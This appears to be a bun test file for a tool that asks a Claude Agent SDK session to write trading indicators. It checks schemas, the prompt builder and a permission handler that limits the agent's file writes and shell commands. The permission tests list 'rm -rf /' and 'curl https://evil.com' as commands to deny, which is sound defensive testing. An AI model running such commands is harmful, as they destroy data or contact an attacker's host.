/**
 * Claude Code Indicator Tests
 *
 * Tests for the Claude Agent SDK V2 integration for indicator implementation.
 */

// Set required environment variables before imports
process.env.CREAM_ENV = "PAPER";
process.env.CREAM_BROKER = "ALPACA";

import { afterEach, describe, expect, test } from "bun:test";
import type { IndicatorHypothesis } from "@cream/indicators";
import {
  buildImplementationPrompt,
  ImplementIndicatorInputSchema,
  ImplementIndicatorOutputSchema,
  implementIndicator,
  type SDKMessage,
  type SDKProvider,
  type Session,
  type SessionOptions,
  setSDKProvider,
} from "./claudeCodeIndicator.js";

// ============================================
// Test Fixtures
// ============================================

const createMockHypothesis = (overrides?: Partial<IndicatorHypothesis>): IndicatorHypothesis => ({
  name: "sector_rotation_momentum",
  category: "correlation",
  // Min 50 chars for hypothesis
  hypothesis:
    "Measures relative strength of sector ETFs to detect rotation patterns in institutional capital flows across market sectors",
  // Min 100 chars for economicRationale
  economicRationale:
    "Sector rotation precedes market moves due to capital flows between sectors as institutions rebalance portfolios based on economic cycle positioning and risk appetite changes over time",
  // Min 50 chars for mathematicalApproach
  mathematicalApproach:
    "Rolling correlation of sector ETF returns with market benchmark using exponential weighting",
  // Each criterion min 10 chars
  falsificationCriteria: [
    "IC below 0.01 over 60 trading days",
    "Correlation above 0.7 with existing indicators",
  ],
  expectedProperties: {
    expectedICRange: [0.02, 0.08] as [number, number],
    maxCorrelationWithExisting: 0.3,
    targetTimeframe: "1d",
    applicableRegimes: ["TRENDING", "ROTATING"],
  },
  relatedAcademicWork: ["Fama-French sector momentum research"],
  ...overrides,
});

const mockExistingPatterns = `
export function calculateRSI(candles: Candle[], config: RSIConfig = DEFAULT_CONFIG): RSIResult {
  if (candles.length < config.period) {
    return { values: [], period: config.period };
  }
  // ... implementation
}
`;

// ============================================
// Schema Tests
// ============================================

describe("ImplementIndicatorInputSchema", () => {
  test("parses valid input with minimal fields", () => {
    const input = {
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
    };

    const result = ImplementIndicatorInputSchema.safeParse(input);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.hypothesis.name).toBe("sector_rotation_momentum");
      expect(result.data.existingPatterns).toBe(mockExistingPatterns);
    }
  });

  test("parses valid input with config overrides", () => {
    const input = {
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
      config: {
        model: "claude-opus-4-20250514",
        maxTurns: 30,
        timeout: 300000,
      },
    };

    const result = ImplementIndicatorInputSchema.safeParse(input);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.config?.model).toBe("claude-opus-4-20250514");
      expect(result.data.config?.maxTurns).toBe(30);
      expect(result.data.config?.timeout).toBe(300000);
    }
  });

  test("rejects maxTurns below minimum", () => {
    const input = {
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
      config: {
        maxTurns: 2, // Below min of 5
      },
    };

    const result = ImplementIndicatorInputSchema.safeParse(input);
    expect(result.success).toBe(false);
  });

  test("rejects maxTurns above maximum", () => {
    const input = {
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
      config: {
        maxTurns: 100, // Above max of 50
      },
    };

    const result = ImplementIndicatorInputSchema.safeParse(input);
    expect(result.success).toBe(false);
  });

  test("rejects timeout below minimum", () => {
    const input = {
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
      config: {
        timeout: 10000, // Below min of 30000
      },
    };

    const result = ImplementIndicatorInputSchema.safeParse(input);
    expect(result.success).toBe(false);
  });

  test("rejects timeout above maximum", () => {
    const input = {
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
      config: {
        timeout: 1000000, // Above max of 600000
      },
    };

    const result = ImplementIndicatorInputSchema.safeParse(input);
    expect(result.success).toBe(false);
  });

  test("rejects missing hypothesis", () => {
    const input = {
      existingPatterns: mockExistingPatterns,
    };

    const result = ImplementIndicatorInputSchema.safeParse(input);
    expect(result.success).toBe(false);
  });

  test("rejects missing existingPatterns", () => {
    const input = {
      hypothesis: createMockHypothesis(),
    };

    const result = ImplementIndicatorInputSchema.safeParse(input);
    expect(result.success).toBe(false);
  });
});

describe("ImplementIndicatorOutputSchema", () => {
  test("parses successful output", () => {
    const output = {
      success: true,
      indicatorPath: "packages/indicators/src/custom/test_indicator.ts",
      testPath: "packages/indicators/src/custom/test_indicator.test.ts",
      astSimilarity: 0.25,
      turnsUsed: 15,
      testsPassed: true,
    };

    const result = ImplementIndicatorOutputSchema.safeParse(output);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.success).toBe(true);
      expect(result.data.astSimilarity).toBe(0.25);
    }
  });

  test("parses failed output with error", () => {
    const output = {
      success: false,
      error: "Claude Agent SDK not installed",
    };

    const result = ImplementIndicatorOutputSchema.safeParse(output);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.success).toBe(false);
      expect(result.data.error).toBe("Claude Agent SDK not installed");
    }
  });

  test("rejects astSimilarity below 0", () => {
    const output = {
      success: true,
      astSimilarity: -0.1,
    };

    const result = ImplementIndicatorOutputSchema.safeParse(output);
    expect(result.success).toBe(false);
  });

  test("rejects astSimilarity above 1", () => {
    const output = {
      success: true,
      astSimilarity: 1.5,
    };

    const result = ImplementIndicatorOutputSchema.safeParse(output);
    expect(result.success).toBe(false);
  });
});

// ============================================
// Prompt Builder Tests
// ============================================

describe("buildImplementationPrompt", () => {
  test("includes hypothesis name in prompt", () => {
    const hypothesis = createMockHypothesis({ name: "test_indicator" });
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("test_indicator");
  });

  test("includes hypothesis statement", () => {
    const hypothesis = createMockHypothesis();
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("Measures relative strength of sector ETFs");
  });

  test("includes economic rationale", () => {
    const hypothesis = createMockHypothesis();
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("Sector rotation precedes market moves");
  });

  test("includes mathematical approach", () => {
    const hypothesis = createMockHypothesis();
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("Rolling correlation of sector ETF returns");
  });

  test("includes falsification criteria", () => {
    const hypothesis = createMockHypothesis();
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("1. IC below 0.01 over 60 trading days");
    expect(prompt).toContain("2. Correlation above 0.7 with existing indicators");
  });

  test("includes expected IC range", () => {
    const hypothesis = createMockHypothesis({
      expectedProperties: {
        expectedICRange: [0.05, 0.15] as [number, number],
        maxCorrelationWithExisting: 0.3,
        targetTimeframe: "1d",
        applicableRegimes: ["TRENDING"],
      },
    });
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("0.05");
    expect(prompt).toContain("0.15");
  });

  test("includes applicable regimes", () => {
    const hypothesis = createMockHypothesis({
      expectedProperties: {
        expectedICRange: [0.02, 0.08] as [number, number],
        maxCorrelationWithExisting: 0.3,
        targetTimeframe: "1d",
        applicableRegimes: ["TRENDING", "MEAN_REVERTING", "VOLATILE"],
      },
    });
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("TRENDING");
    expect(prompt).toContain("MEAN_REVERTING");
    expect(prompt).toContain("VOLATILE");
  });

  test("includes existing patterns in code block", () => {
    const prompt = buildImplementationPrompt(createMockHypothesis(), mockExistingPatterns);

    expect(prompt).toContain("```typescript");
    expect(prompt).toContain("calculateRSI");
  });

  test("includes correct file paths", () => {
    const hypothesis = createMockHypothesis({ name: "my_custom_indicator" });
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("packages/indicators/src/custom/my_custom_indicator.ts");
    expect(prompt).toContain("packages/indicators/src/custom/my_custom_indicator.test.ts");
  });

  test("includes PascalCase function name", () => {
    const hypothesis = createMockHypothesis({ name: "sector_rotation_momentum" });
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("calculateSectorRotationMomentum");
    expect(prompt).toContain("SectorRotationMomentumResult");
    expect(prompt).toContain("SectorRotationMomentumConfig");
  });

  test("includes related academic work when provided", () => {
    const hypothesis = createMockHypothesis();
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("Related Academic Work");
    expect(prompt).toContain("Fama-French sector momentum research");
  });

  test("omits related academic work section when empty", () => {
    const hypothesis = createMockHypothesis({
      relatedAcademicWork: [],
    });
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).not.toContain("Related Academic Work");
  });

  test("includes bun test command", () => {
    const hypothesis = createMockHypothesis({ name: "test_indicator" });
    const prompt = buildImplementationPrompt(hypothesis, mockExistingPatterns);

    expect(prompt).toContain("bun test packages/indicators/src/custom/test_indicator.test.ts");
  });
});

// ============================================
// Mock SDK Factory
// ============================================

/**
 * Create a mock SDK provider for testing
 */
function createMockSDKProvider(options: {
  messages?: SDKMessage[];
  shouldFail?: boolean;
  capturedOptions?: { value: SessionOptions | null };
  capturedPrompt?: { value: string | null };
}): SDKProvider {
  const {
    messages = [],
    shouldFail = false,
    capturedOptions = { value: null },
    capturedPrompt = { value: null },
  } = options;

  return {
    createSession: (sessionOptions: SessionOptions): Session => {
      capturedOptions.value = sessionOptions;

      return {
        send: async (prompt: string) => {
          capturedPrompt.value = prompt;
          if (shouldFail) {
            throw new Error("Mock SDK send failed");
          }
        },
        stream: async function* (): AsyncGenerator<SDKMessage> {
          for (const msg of messages) {
            yield msg;
          }
        },
        close: () => {
          // No-op for mock
        },
      };
    },
  };
}

// ============================================
// Integration Tests with Mock SDK
// ============================================

describe("implementIndicator with mock SDK", () => {
  afterEach(() => {
    // Reset SDK provider after each test
    setSDKProvider(null);
  });

  test("returns SDK not installed error when SDK disabled", async () => {
    // Explicitly disable SDK (prevents real SDK import attempt)
    setSDKProvider("disabled");

    const result = await implementIndicator({
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("Claude Agent SDK not installed");
  });

  test("creates session with correct options", async () => {
    const capturedOptions = { value: null as SessionOptions | null };
    const mockProvider = createMockSDKProvider({
      messages: [{ type: "assistant", session_id: "test-session" }],
      capturedOptions,
    });

    setSDKProvider(mockProvider);

    await implementIndicator({
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
    });

    expect(capturedOptions.value).not.toBeNull();
    expect(capturedOptions.value?.model).toBe("claude-sonnet-4-20250514");
    expect(capturedOptions.value?.maxTurns).toBe(20);
    expect(capturedOptions.value?.allowedTools).toContain("Read");
    expect(capturedOptions.value?.allowedTools).toContain("Write");
    expect(capturedOptions.value?.allowedTools).toContain("Bash");
  });

  test("sends implementation prompt to session", async () => {
    const capturedPrompt = { value: null as string | null };
    const mockProvider = createMockSDKProvider({
      messages: [{ type: "assistant", session_id: "test-session" }],
      capturedPrompt,
    });

    setSDKProvider(mockProvider);

    await implementIndicator({
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
    });

    expect(capturedPrompt.value).not.toBeNull();
    expect(capturedPrompt.value).toContain("sector_rotation_momentum");
    expect(capturedPrompt.value).toContain("packages/indicators/src/custom");
  });

  test("counts turns from assistant messages", async () => {
    const mockProvider = createMockSDKProvider({
      messages: [
        { type: "assistant", session_id: "test-session" },
        { type: "tool_use", session_id: "test-session" },
        { type: "assistant", session_id: "test-session" },
        { type: "tool_result", session_id: "test-session" },
        { type: "assistant", session_id: "test-session" },
      ],
    });

    setSDKProvider(mockProvider);

    const result = await implementIndicator({
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
    });

    // turnsUsed should count only assistant messages (3)
    expect(result.turnsUsed).toBe(3);
  });

  test("respects config overrides", async () => {
    const capturedOptions = { value: null as SessionOptions | null };
    const mockProvider = createMockSDKProvider({
      messages: [{ type: "assistant", session_id: "test-session" }],
      capturedOptions,
    });

    setSDKProvider(mockProvider);

    await implementIndicator({
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
      config: {
        model: "claude-opus-4-20250514",
        maxTurns: 30,
      },
    });

    expect(capturedOptions.value?.model).toBe("claude-opus-4-20250514");
    expect(capturedOptions.value?.maxTurns).toBe(30);
  });

  test("canUseTool allows Read operations", async () => {
    const capturedOptions = { value: null as SessionOptions | null };
    const mockProvider = createMockSDKProvider({
      messages: [{ type: "assistant", session_id: "test-session" }],
      capturedOptions,
    });

    setSDKProvider(mockProvider);

    await implementIndicator({
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
    });

    const canUseTool = capturedOptions.value?.canUseTool;
    expect(canUseTool).toBeDefined();

    if (canUseTool) {
      const result = await canUseTool("Read", { file_path: "/any/path.ts" });
      expect(result.behavior).toBe("allow");
    }
  });

  test("canUseTool allows Write to custom directory", async () => {
    const capturedOptions = { value: null as SessionOptions | null };
    const mockProvider = createMockSDKProvider({
      messages: [{ type: "assistant", session_id: "test-session" }],
      capturedOptions,
    });

    setSDKProvider(mockProvider);

    await implementIndicator({
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
    });

    const canUseTool = capturedOptions.value?.canUseTool;
    expect(canUseTool).toBeDefined();

    if (canUseTool) {
      const allowed = await canUseTool("Write", {
        file_path: "packages/indicators/src/custom/test.ts",
      });
      expect(allowed.behavior).toBe("allow");

      const denied = await canUseTool("Write", {
        file_path: "packages/indicators/src/momentum/test.ts",
      });
      expect(denied.behavior).toBe("deny");
    }
  });

  test("canUseTool allows safe Bash commands", async () => {
    const capturedOptions = { value: null as SessionOptions | null };
    const mockProvider = createMockSDKProvider({
      messages: [{ type: "assistant", session_id: "test-session" }],
      capturedOptions,
    });

    setSDKProvider(mockProvider);

    await implementIndicator({
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
    });

    const canUseTool = capturedOptions.value?.canUseTool;
    expect(canUseTool).toBeDefined();

    if (canUseTool) {
      const testAllowed = await canUseTool("Bash", { command: "bun test packages/indicators" });
      expect(testAllowed.behavior).toBe("allow");

      const lsAllowed = await canUseTool("Bash", { command: "ls -la" });
      expect(lsAllowed.behavior).toBe("allow");

      const dangerousDenied = await canUseTool("Bash", { command: "rm -rf /" });
      expect(dangerousDenied.behavior).toBe("deny");
    }
  });

  test("validates input before SDK call", () => {
    const validInput = {
      hypothesis: createMockHypothesis(),
      existingPatterns: mockExistingPatterns,
    };

    const result = ImplementIndicatorInputSchema.safeParse(validInput);
    expect(result.success).toBe(true);
  });
});

// ============================================
// Tool Permission Tests
// ============================================

describe("tool permission handler logic", () => {
  // These tests verify the permission handler logic in isolation
  // The actual handler is tested through integration tests when SDK is available

  test("Read tool should be allowed", () => {
    const allowedReadTools = ["Read", "Grep", "Glob"];
    expect(allowedReadTools.includes("Read")).toBe(true);
  });

  test("Write tool requires /custom/ in path", () => {
    const validPath = "packages/indicators/src/custom/test.ts";
    const invalidPath = "packages/indicators/src/momentum/test.ts";

    expect(validPath.includes("/custom/")).toBe(true);
    expect(invalidPath.includes("/custom/")).toBe(false);
  });

  test("Bash tool allows bun test commands", () => {
    const validCommands = ["bun test packages/indicators", "ls -la"];
    const invalidCommands = ["rm -rf /", "curl https://evil.com"];

    for (const cmd of validCommands) {
      expect(cmd.startsWith("bun test") || cmd.startsWith("ls")).toBe(true);
    }

    for (const cmd of invalidCommands) {
      expect(cmd.startsWith("bun test") || cmd.startsWith("ls")).toBe(false);
    }
  });
});

// ============================================
// AST Similarity Threshold Tests
// ============================================

describe("AST similarity threshold", () => {
  test("similarity above 0.8 should be rejected", () => {
    const threshold = 0.8;
    const highSimilarity = 0.85;
    const lowSimilarity = 0.25;

    expect(highSimilarity > threshold).toBe(true);
    expect(lowSimilarity > threshold).toBe(false);
  });
});

// ============================================
// Export Tests
// ============================================

describe("claudeCodeIndicator exports", () => {
  test("exports tool definition", async () => {
    const { claudeCodeIndicator } = await import("./claudeCodeIndicator.js");

    expect(claudeCodeIndicator.name).toBe("implement-indicator");
    expect(claudeCodeIndicator.description).toContain("Claude Code");
    expect(claudeCodeIndicator.inputSchema).toBeDefined();
    expect(claudeCodeIndicator.outputSchema).toBeDefined();
    expect(claudeCodeIndicator.execute).toBeDefined();
  });
});
